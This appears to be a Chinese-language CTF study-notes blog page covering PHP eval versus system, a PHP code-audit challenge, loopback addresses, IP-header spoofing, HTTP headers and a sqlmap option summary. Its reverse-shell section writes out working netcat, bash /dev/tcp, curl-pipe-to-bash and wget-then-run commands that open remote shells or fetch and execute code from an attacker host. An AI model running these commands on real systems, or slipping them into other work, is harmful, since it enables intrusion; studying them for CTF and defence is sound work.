<h1 id="7-eval-函数和system-函数的比较"><a href="#7-eval-函数和system-函数的比较" class="headerlink" title="7.eval()函数和system()函数的比较"></a>7.eval()函数和system()函数的比较</h1><p><code>记录一次在打靶机时，因为平常习惯用 eval()函数，但是靶机执行nc等命令时，eval()函数没有反应，就是因为其是代码执行，而非命令执行，所以把两者本质的用法搞懂还是很必要的</code></p>
<blockquote>
<p>eval类型函数是代码执行而不是命令执行（一句话木马）</p>
<p>system类型函数是命令执行而不是代码执行</p>
<p>eval函数里必须是一个符合php语法的语句，如果语句结尾没有分号会报错：eval()’d code</p>
</blockquote>
<h1 id="8-随手记录题目"><a href="#8-随手记录题目" class="headerlink" title="8.随手记录题目"></a>8.随手记录题目</h1><h2 id="1）头疼的php代码审计"><a href="#1）头疼的php代码审计" class="headerlink" title="1）头疼的php代码审计"></a>1）头疼的<code>php</code>代码审计</h2><p>第一眼很头疼的<code>php</code>代码审计，但看着却没有什么太大的考点，这里我没有题目，就在本地试试能不能绕过所有的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// code by SEC@USTC </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;charset&quot; content=&quot;gbk&quot;&gt;&lt;/head&gt;&lt;body&gt;&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$URL</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]; </span><br><span class="line"><span class="comment">//echo &#x27;URL: &#x27;.$URL.&#x27;&lt;br/&gt;&#x27;; </span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;CTF&#123;???&#125;&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$flag</span>, <span class="string">&#x27;CTF&#123;???&#125;&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./index.php&#x27;</span>)); </span><br><span class="line"><span class="variable">$stop</span> = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;./&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">1</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;\\&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">2</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$matches</span> = <span class="keyword">array</span>(); </span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9a-z\/.]+)$/&#x27;</span>, <span class="variable">$URL</span>, <span class="variable">$matches</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$matches</span>) || <span class="variable">$matches</span>[<span class="number">1</span>] != <span class="variable">$URL</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">3</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;//&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">4</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$URL</span>, -<span class="number">10</span>) !== <span class="string">&#x27;/index.php&#x27;</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">5</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$URL</span>, <span class="string">&#x27;p.&#x27;</span>) !== <span class="literal">FALSE</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">6</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span> &amp;&amp; <span class="variable">$URL</span> == <span class="string">&#x27;/fan/index.php&#x27;</span>)&#123; </span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;&quot;</span>; </span><br><span class="line">    <span class="variable">$stop</span> = <span class="number">7</span>;        <span class="comment">//Pass </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$stop</span>) <span class="variable">$stop</span> = <span class="number">8</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>; </span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="variable">$stop</span>; <span class="variable">$i</span>++) </span><br><span class="line">    <span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;//Pass &#x27;</span>.<span class="variable">$i</span>, <span class="string">&#x27;//Pass&#x27;</span>, <span class="variable">$code</span>); </span><br><span class="line"><span class="keyword">for</span>(; <span class="variable">$i</span> &lt; <span class="number">8</span>; <span class="variable">$i</span>++) </span><br><span class="line">    <span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;//Pass &#x27;</span>.<span class="variable">$i</span>, <span class="string">&#x27;//Not Pass&#x27;</span>, <span class="variable">$code</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">highlight_string</span>(<span class="variable">$code</span>, <span class="literal">TRUE</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="9-反弹shell姿势"><a href="#9-反弹shell姿势" class="headerlink" title="9.反弹shell姿势"></a>9.反弹shell姿势</h1><h2 id="netcat-一句话反弹"><a href="#netcat-一句话反弹" class="headerlink" title="netcat 一句话反弹"></a>netcat 一句话反弹</h2><p>获取<code>shell</code>（想反弹谁的<code>shell</code>就在谁的后面加<code>-e /bin/sh</code>或<code>-e /bin/bash</code>）</p>
<h3 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向<code>shell</code></h3><p> 客户端主动连接服务器并获取服务器shell</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">客户端主动连接并得到反弹shell    </span><br><span class="line">    nc 服务端ip <span class="number">8888</span></span><br><span class="line">服务端监听连接</span><br><span class="line">    nc -lvp <span class="number">8888</span> -e <span class="regexp">/bin/</span>sh </span><br><span class="line">    <span class="comment"># windows上：nc -lvp 8888 -e c:\windows\system32\cmd.exe </span></span><br></pre></td></tr></table></figure>

<h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向<code>shell</code></h3><p>服务器端连接并反弹<code>shell</code>给客户端</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">客户端监听</span></span><br><span class="line"><span class="string">nc</span> <span class="string">-lvp</span> <span class="number">8888</span> </span><br><span class="line"><span class="string">服务端连接客户端</span></span><br><span class="line"><span class="string">nc</span> <span class="string">客户端ip</span> <span class="number">8888</span> <span class="string">-e</span> <span class="string">/bin/sh</span> </span><br><span class="line"></span><br><span class="line"><span class="string">windows上：nc</span> <span class="string">ip</span> <span class="number">8888</span> <span class="string">-e</span> <span class="string">c:\windows\system32\cmd.exe</span></span><br></pre></td></tr></table></figure>

<h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/我们靶机ip/</span>我们靶机 port <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><code>bash</code>一句话命令详解<br>以下针对常用的<code>bash</code>反弹一句话进行了拆分说明，具体内容如下</p>
<p><img src="/2022/05/31/daily/image-20221019235717724.png" alt="image-20221019235717724"></p>
<blockquote>
<p>其实以上bash反弹一句完整的解读过程就是：<br>bash产生了一个交互环境与本地主机主动发起与目标主机<code>8080</code>端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个<code>tcp 8080</code>会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash反弹环境。</p>
</blockquote>
<p>在反弹<code>shell</code>时要借助<code>netcat</code>工具反弹</p>
<h2 id="curl反弹shell"><a href="#curl反弹shell" class="headerlink" title="curl反弹shell"></a>curl反弹shell</h2><p>前提要利用<code>bash</code>一句话的情况下使用<code>curl</code>反弹<code>shell</code></p>
<p>在存在<code>命令执行</code>的服务器上执行</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">curl [自己的服务器]ip<span class="string">|bash</span></span><br><span class="line"><span class="comment">//在利用curl里执行我自己的服务器上的bash一句话</span></span><br></pre></td></tr></table></figure>

<p>该<code>ip</code>的<code>index</code>文件上含有<code>bash</code>一句话，就可以反弹<code>shell</code>。</p>
<p>例如在自己的服务器<code>index文件</code>上写上一句话</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="number">192.168.20.151</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p> <code>192.168.20.151</code>就是作为监听端口的服务器【攻击机】用来得到反弹的shell。</p>
<p><img src="/2022/05/31/daily/image-20221020000027288.png" alt="image-20221020000027288"></p>
<p> 存在一句话，利用<code>curl</code>反弹。<br><code>kali</code>开启监听</p>
<p><img src="/2022/05/31/daily/image-20221020000337460.png" alt="image-20221020000337460"></p>
<h2 id="wget方式反弹shell"><a href="#wget方式反弹shell" class="headerlink" title="wget方式反弹shell"></a><code>wget</code>方式反弹<code>shell</code></h2><p>利用<code>wget</code>进行下载执行</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget <span class="number">192.168</span>.<span class="number">20.130</span><span class="regexp">/shell.txt -O /</span>tmp<span class="regexp">/x.php &amp;&amp; php /</span>tmp/x.php</span><br></pre></td></tr></table></figure>

<p>利用下面贴出的<code>php</code>进行反弹。<br>开启监听</p>
<p> <img src="/2022/05/31/daily/image-20221020000353533.png" alt="image-20221020000353533"></p>
<h1 id="10-本地回环"><a href="#10-本地回环" class="headerlink" title="10.本地回环"></a>10.本地回环</h1><blockquote>
<p>本地回环地址（<code>Loop back address</code>），不属于任何一个有类别地址类。它代表设备的本地虚拟接口，所以默认被看作是永远不会宕掉的接口。</p>
<p>主要作用有两个：一是测试本机的网络配置，能PING通<code>127.0.0.1</code>说明本机的网卡和<code>IP</code>协议安装都没有问题；另一个作用是某些<code>SERVER/CLIENT</code>的应用程序在运行时需调用服务器上的资源，一般要指定<code>SERVER</code>的<code>IP</code>地址，但当该程序要在同一台机器上运行而没有别的<code>SERVER</code>时就可以把SERVER的资源装在本机，<code>SERVER</code>的<code>IP</code>地址设为<code>127.0.0.1</code>同样也可以运行。</p>
<p><strong>本地回环地址指的是以<code>127</code>开头的地址（<code>127.0.0.1 - 127.255.255.254</code>），通常用<code>127.0.0.1</code>来表示</strong></p>
<p>但是，使用<code>127.0.0.1/8</code>内的不同地址，就可以在本机上设置侦听相同端口的多个服务器</p>
</blockquote>
<h1 id="11-client-ip和X-Forwarded-For"><a href="#11-client-ip和X-Forwarded-For" class="headerlink" title="11.client-ip和X-Forwarded-For"></a>11.<code>client-ip</code>和<code>X-Forwarded-For</code></h1><blockquote>
<p>1）<code>client-ip</code>：客户端ip，相较于X-Forwarded-For，它只有一个ip也就是真实ip，当不能伪造XFF头的时候，就可以用client-ip代替，直接指明伪造ip</p>
<p>2）<code>X-Forwarded-For</code>:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP  代理或者负载均衡服务器时才会添加该项。xff是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</p>
</blockquote>
<h1 id="12-请求头、响应头全部内容"><a href="#12-请求头、响应头全部内容" class="headerlink" title="12.请求头、响应头全部内容"></a>12.请求头、响应头全部内容</h1><h2 id="HTTP请求头"><a href="#HTTP请求头" class="headerlink" title="HTTP请求头"></a>HTTP请求头</h2><blockquote>
<p>Accept：浏览器可接受的MIME类型。</p>
<p>Accept-Charset：浏览器可接受的字符集。</p>
<p>Accept-Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间。</p>
<p>Accept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到。</p>
<p><code>Authorization</code>：授权信息，通常出现在对服务器发送的WWW-Authenticate头的应答中。</p>
<p>Connection：表示是否需要持久连接。如果Servlet看到这里的值为“Keep-Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，Servlet需要在应答中发送一个Content-Length头，最简单的实现方法是：先把内容写入ByteArrayOutputStream，然后在正式写出内容之前计算它的大小。</p>
<p>Content-Length：表示请求消息正文的长度。</p>
<p><code>Cookie</code>：这是最重要的请求头信息之一</p>
<p>From：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它。</p>
<p><code>Host</code>：初始URL中的主机和端口。</p>
<p>If-Modified-Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答。</p>
<p>Pragma：指定“no-cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝。</p>
<p><code>Referer</code>：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。</p>
<p><code>User-Agent</code>：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用。</p>
<p>UA-Pixels，UA-Color，UA-OS，UA-CPU：由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型。</p>
</blockquote>
<h2 id="HTTP应答头"><a href="#HTTP应答头" class="headerlink" title="HTTP应答头"></a>HTTP应答头</h2><blockquote>
<p>Web服务器的HTTP应答一般由以下几项构成：一个状态行，一个或多个应答头，一个空行，内容文档。设置HTTP应答头往往和设置状态行中的状态代码结合起来。例如，有好几个表示“文档位置已经改变”的状态代码都伴随着一个Location头，而401（Unauthorized）状态代码则必须伴随一个WWW-Authenticate头。<br>然而，即使在没有设置特殊含义的状态代码时，指定应答头也是很有用的。应答头可以用来完成：设置Cookie，指定修改日期，指示浏览器按照指定的间隔刷新页面，声明文档的长度以便利用持久HTTP连接，等等许多其他任务。<br>设置应答头最常用的方法是<code>HttpServletResponse</code>的<code>setHeader</code>，该方法有两个参数，分别表示应答头的名字和值。和设置状态代码相似，设置应答头应该在发送任何文档内容之前进行。</p>
</blockquote>
<blockquote>
<p><code>setContentType</code>：设置Content-Type头。大多数<code>Servlet</code>都要用到这个方法。</p>
<p>setContentLength：设置Content-Length头。对于支持持久HTTP连接的浏览器来说，这个函数是很有用的。</p>
<p><code>addCookie</code>：设置一个Cookie（<code>Servlet</code> <code>API</code>中没有<code>setCookie</code>方法，因为应答往往包含多个Set-Cookie头）。<br>另外，如上节介绍，<code>sendRedirect</code>方法设置状态代码302时也会设置Location头。</p>
<p>HTTP应答头 说明<br>Allow 服务器支持哪些请求方法（如GET、POST等）。</p>
<p>Content-Encoding 文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用<code>gzip</code>压缩文档能够显著地减少HTML文档的下载时间。Java的<code>GZIPOutputStream</code>可以很方便地进行<code>gzip</code>压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，<code>Servlet</code>应该通过查看Accept-Encoding头（即<code>request.getHeader</code>(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持<code>gzip</code>的浏览器返回经<code>gzip</code>压缩的HTML页面，为其他浏览器返回普通页面。</p>
<p>Content-Length 表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入ByteArrayOutputStram，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</p>
<p>Content-Type 表示后面的文档属于什么MIME类型。Servlet默认为text&#x2F;plain，但通常需要显式地指定为<br>text&#x2F;html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</p>
<p>Date 当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</p>
<p>Expires 应该在什么时候认为文档已经过期，从而不再缓存它？<br>Last-Modified 文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</p>
<p>Location 表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</p>
<p>Refresh 表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">setHeader</span><span class="params">(<span class="string">&quot;Refresh&quot;</span>, <span class="string">&quot;5; URL=http://host/path&quot;</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>让浏览器读取指定的页面。注意这种功能通常是通过设置HTML页面HEAD区的</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;META <span class="attribute">HTTP-EQUIV</span>=<span class="string">&quot;Refresh&quot;</span> <span class="attribute">CONTENT</span>=<span class="string">&quot;5;URL=http://host/path&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p><code>[注，笔者开始把这段代码复制到该博客时，发现一直在向host/path，跳转，最后查看网络，才发现这里这段代码发挥了作用，并没有当作简单的文本]</code></p>
<p>实现，这是因为，自动刷新或重定向对于那些不能使用<code>CGI</code>或<code>Servlet</code>的HTML编写者十分重要。但是，对于<code>Servlet</code>来说，直接设置Refresh头更加方便。注意Refresh的意义是“N秒之后刷新本页面或访问指定页面”，而不是“每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是&lt;META HTTP-EQUIV&#x3D;”Refresh” …&gt;。注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</p>
<p>Server 服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</p>
<p><code>Set-Cookie</code> 设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</p>
<p>WWW-Authenticate 客户应该在Authorization头中提供什么类型的授权信息？在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，<code>response.setHeader</code>(“WWW-Authenticate”, “BASIC realm&#x3D;&quot;executives&quot;“)。注意<code>Servlet</code>一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如<code>.htaccess</code>）。</p>
</blockquote>
<h1 id="13-session利用的小思路"><a href="#13-session利用的小思路" class="headerlink" title="13.session利用的小思路"></a>13.session利用的小思路</h1><p><strong>常见的基本就两种，<code>session</code>文件包含和<code>session</code>反序列化</strong></p>
<p><code>原文链接</code>：<a href="https://xz.aliyun.com/t/10662">https://xz.aliyun.com/t/10662</a></p>
<h1 id="14-sqlmap使用总结"><a href="#14-sqlmap使用总结" class="headerlink" title="14.sqlmap使用总结"></a>14.sqlmap使用总结</h1><blockquote>
<p>原文作者: Ywc</p>
<p>原文链接: <a href="https://yinwc.github.io/2018/07/05/sqlmap/">https://yinwc.github.io/2018/07/05/sqlmap/</a></p>
<p>发表日期: July 5th 2018, 1:20:40 pm</p>
<p>版权声明:</p>
</blockquote>
<h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><p><code>–version</code> 显示程序的版本号并退出<br><code>-h, –help</code> 显示此帮助消息并退出<br><code>-v VERBOSE</code> 详细级别：0-6（默认为1）</p>
<h3 id="Target-目标"><a href="#Target-目标" class="headerlink" title="Target(目标)"></a><strong>Target(目标)</strong></h3><p>以下至少需要设置其中一个选项，设置目标 URL。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-d DIRECT 直接连接到数据库。</span></span><br><span class="line"><span class="deletion">-u URL, –url=URL 目标 URL。</span></span><br><span class="line"><span class="deletion">-l LIST 从 Burp 或 WebScarab 代理的日志中解析目标。</span></span><br><span class="line"><span class="deletion">-r REQUESTFILE 从一个文件中载入 HTTP 请求。</span></span><br><span class="line"><span class="deletion">-g GOOGLEDORK 处理 Google dork 的结果作为目标 URL。</span></span><br><span class="line"><span class="deletion">-c CONFIGFILE 从 INI 配置文件中加载选项。</span></span><br></pre></td></tr></table></figure>

<h3 id="Request（请求）"><a href="#Request（请求）" class="headerlink" title="Request（请求）"></a><strong>Request（请求）</strong></h3><p>这些选项可以用来指定如何连接到目标URL。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">–<span class="attribute">data</span>=DATA 通过 POST 发送的数据字符串</span><br><span class="line">–<span class="attribute">cookie</span>=COOKIE HTTP Cookie 头</span><br><span class="line">–cookie-urlencode URL 编码生成的 cookie 注入</span><br><span class="line">–drop-set-cookie 忽略响应的 <span class="built_in">Set</span> –Cookie 头信息</span><br><span class="line">–<span class="attribute">user-agent</span>=AGENT 指定 HTTP<span class="built_in"> User </span>–Agent 头</span><br><span class="line">–random-agent 使用随机选定的 HTTP User-Agent 头</span><br><span class="line">–<span class="attribute">referer</span>=REFERER 指定 HTTP Referer 头</span><br><span class="line">–<span class="attribute">headers</span>=HEADERS 换行分开，加入其他的 HTTP 头</span><br><span class="line">–<span class="attribute">auth-type</span>=ATYPE HTTP 身份验证类型（基本，摘要或NTLM）(Basic, Digest <span class="keyword">or</span> NTLM)</span><br><span class="line">–<span class="attribute">auth-cred</span>=ACRED HTTP 身份验证凭据（用户名:密码）</span><br><span class="line">–<span class="attribute">auth-cert</span>=ACERT HTTP 认证证书（key_file，cert_file）</span><br><span class="line">–<span class="attribute">proxy</span>=PROXY 使用 HTTP 代理连接到目标 URL</span><br><span class="line">–<span class="attribute">proxy-cred</span>=PCRED HTTP 代理身份验证凭据（用户名：密码）</span><br><span class="line">–ignore-proxy 忽略系统默认的 HTTP 代理</span><br><span class="line">–<span class="attribute">delay</span>=DELAY 在每个 HTTP 请求之间的延迟时间，单位为秒</span><br><span class="line">–<span class="attribute">timeout</span>=TIMEOUT 等待连接超时的时间（默认为30 秒）</span><br><span class="line">–<span class="attribute">retries</span>=RETRIES 连接超时后重新连接的时间（默认3）</span><br><span class="line">–<span class="attribute">scope</span>=SCOPE 从所提供的代理日志中过滤器目标的正则表达式</span><br><span class="line">–<span class="attribute">safe-url</span>=SAFURL 在测试过程中经常访问的 url 地址</span><br><span class="line">–<span class="attribute">safe-freq</span>=SAFREQ 两次访问之间测试请求，给出安全的 URL</span><br></pre></td></tr></table></figure>

<h3 id="Optimization（优化）"><a href="#Optimization（优化）" class="headerlink" title="Optimization（优化）"></a><strong>Optimization（优化）</strong></h3><p>这些选项可用于优化 sqlmap.py 的性能。</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line">-<span class="variable">o</span> 开启所有优化开关</span><br><span class="line">–<span class="variable">predict</span>-<span class="variable">output</span> 预测常见的查询输出</span><br><span class="line">–<span class="variable">keep</span>-<span class="variable">alive</span> 使用持久的 <span class="function"><span class="title">HTTP</span>(<span class="variable">S</span>) 连接</span></span><br><span class="line"><span class="function">–<span class="variable"><span class="literal">null</span></span>-<span class="variable">connection</span> 从没有实际的 <span class="variable">HTTP</span> 响应体中检索页面长度</span></span><br><span class="line"><span class="function">–<span class="variable">threads</span>=<span class="variable">THREADS</span> 最大的 <span class="title">HTTP</span>(<span class="variable">S</span>) 请求并发量（默认为<span class="number">1</span>）</span></span><br></pre></td></tr></table></figure>

<h3 id="Injection（注入）"><a href="#Injection（注入）" class="headerlink" title="Injection（注入）"></a><strong>Injection（注入）</strong></h3><p>这些选项可以用来指定测试哪些参数，提供自定义的注入 payloads 和可选篡改脚本。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">-p TESTPARAMETER 可测试的参数</span><br><span class="line">–<span class="attribute">dbms</span>=DBMS 强制后端的 DBMS 为此值</span><br><span class="line">–<span class="attribute">os</span>=OS 强制后端的 DBMS 操作系统为这个值</span><br><span class="line">–<span class="attribute">prefix</span>=PREFIX 注入 payload 字符串前缀</span><br><span class="line">–<span class="attribute">suffix</span>=SUFFIX 注入 payload 字符串后缀</span><br><span class="line">–<span class="attribute">tamper</span>=TAMPER 使用给定的脚本篡改注入数据</span><br><span class="line">–tamper 通过编码绕过 WEB 防火墙（WAF）sqlmap.py 默认用 char()</span><br><span class="line">–tamper 插件所在目录\sqlmap-dev\tamper</span><br></pre></td></tr></table></figure>

<h3 id="Detection（检测）"><a href="#Detection（检测）" class="headerlink" title="Detection（检测）"></a>Detection（检测）</h3><p>这些选项可以用来指定在 SQL 盲注时如何解析和比较 HTTP 响应页面的内容</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">–<span class="attribute">level</span>=LEVEL 执行测试的等级（1-5，默认为 1）</span><br><span class="line">–<span class="attribute">risk</span>=RISK 执行测试的风险（0-3，默认为 1）</span><br><span class="line">–<span class="attribute">string</span>=STRING 查询有效时在页面匹配字符串</span><br><span class="line">–<span class="attribute">regexp</span>=REGEXP 查询有效时在页面匹配正则表达式</span><br><span class="line">–text-only 仅基于文本内容比较网页</span><br></pre></td></tr></table></figure>

<p>这些选项可用于调整具体的 SQL 注入测试</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">–technique<span class="operator">=</span>TECH SQL 注入技术测试（默认 BEUST）</span><br><span class="line">Techniques（技巧）：</span><br><span class="line">–technique /*测试指定注入类型\使用的技术</span><br></pre></td></tr></table></figure>

<p>不加参数默认测试所有注入技术：</p>
<p>不加参数默认测试所有注入技术：</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">B:</span> 基于布尔的 SQL 盲注</span><br><span class="line"><span class="symbol">E:</span> 基于显错 sql 注入</span><br><span class="line"><span class="symbol">U:</span> 基于 UNION 注入</span><br><span class="line"><span class="symbol">S:</span> 叠层 sql 注入</span><br><span class="line"><span class="symbol">T:</span> 基于时间盲注</span><br></pre></td></tr></table></figure>



<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">–<span class="attribute">time-sec</span>=TIMESEC DBMS 响应的延迟时间（默认为 5 秒）</span><br><span class="line">–<span class="attribute">union-cols</span>=UCOLS 定列范围用于测试 UNION 查询注入</span><br><span class="line">–<span class="attribute">union-char</span>=UCHAR 用于暴力猜解列数的字符</span><br></pre></td></tr></table></figure>

<h3 id="Fingerprint（指纹）"><a href="#Fingerprint（指纹）" class="headerlink" title="Fingerprint（指纹）"></a>Fingerprint（指纹）</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-f, –fingerprint 执行检查广泛的 DBMS 版本指纹</span></span><br></pre></td></tr></table></figure>

<h3 id="Enumeration（枚举）"><a href="#Enumeration（枚举）" class="headerlink" title="Enumeration（枚举）"></a>Enumeration（枚举）</h3><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的 SQL 语句。</p>
